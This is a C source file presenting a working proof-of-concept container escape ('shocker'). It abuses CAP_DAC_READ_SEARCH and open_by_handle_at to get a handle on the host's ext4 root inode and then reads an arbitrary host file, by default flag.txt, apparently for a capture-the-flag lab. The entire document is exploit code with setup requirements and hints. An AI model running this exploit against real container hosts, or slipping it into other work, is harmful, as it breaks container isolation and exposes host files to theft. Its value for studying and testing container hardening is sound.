#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

/*
 * shocker.c -- CAP_DAC_READ_SEARCH container escape proof-of-concept.
 *
 * Uses open_by_handle_at(2) to obtain a file descriptor for the host root
 * inode (ext4 inode 2) and then openat(2) to read a file at the host root,
 * bypassing path traversal and normal permission checks.
 *
 * Requirements:
 *   - container has CAP_DAC_READ_SEARCH
 *   - seccomp must not block open_by_handle_at (use --security-opt seccomp=unconfined)
 *   - the host root filesystem must be ext4 (overlayfs has no stable handles)
 *   - any file on a HOST filesystem is mounted into the container, so that we
 *     obtain a mount fd whose underlying fs is the host's
 */

/* ext4 root directory inode is always 2 */
#define HOST_ROOT_INODE 2

int main(int argc, char **argv)
{
    const char *mount_probe = (argc > 1) ? argv[1] : "/host-etc/hostname";
    const char *target      = (argc > 2) ? argv[2] : "flag.txt";

    int mount_fd = open(mount_probe, O_RDONLY);
    if (mount_fd < 0) {
        perror("open mount probe");
        fprintf(stderr, "hint: mount a host directory (e.g. -v /etc:/host-etc)\n");
        return 1;
    }
    printf("[*] mount probe fd = %d (%s)\n", mount_fd, mount_probe);

    /* struct file_handle has a flexible array member; allocate room for 8 bytes */
    struct file_handle *fh = malloc(sizeof(struct file_handle) + 8);
    if (!fh) { perror("malloc"); return 1; }
    fh->handle_bytes = 8;
    fh->handle_type  = 1;

    /* ext4 stores the inode number little-endian in the handle */
    unsigned char inode[8] = {HOST_ROOT_INODE, 0, 0, 0, 0, 0, 0, 0};
    memcpy(fh->f_handle, inode, 8);

    int hfd = syscall(SYS_open_by_handle_at, mount_fd, fh, O_RDONLY | O_DIRECTORY);
    if (hfd < 0) {
        perror("open_by_handle_at");
        fprintf(stderr, "hint: need CAP_DAC_READ_SEARCH and seccomp=unconfined, "
                        "and an ext4 host root\n");
        free(fh);
        return 1;
    }
    printf("[+] host root fd = %d\n", hfd);

    int flag_fd = openat(hfd, target, O_RDONLY);
    if (flag_fd < 0) {
        perror("openat target");
        free(fh);
        return 1;
    }

    char buf[512];
    ssize_t n = read(flag_fd, buf, sizeof(buf) - 1);
    if (n < 0) { perror("read"); free(fh); return 1; }
    buf[n] = '\0';

    printf("[+] %s contents:\n%s", target, buf);
    if (buf[n - 1] != '\n') printf("\n");

    close(flag_fd);
    close(hfd);
    close(mount_fd);
    free(fh);
    return 0;
}
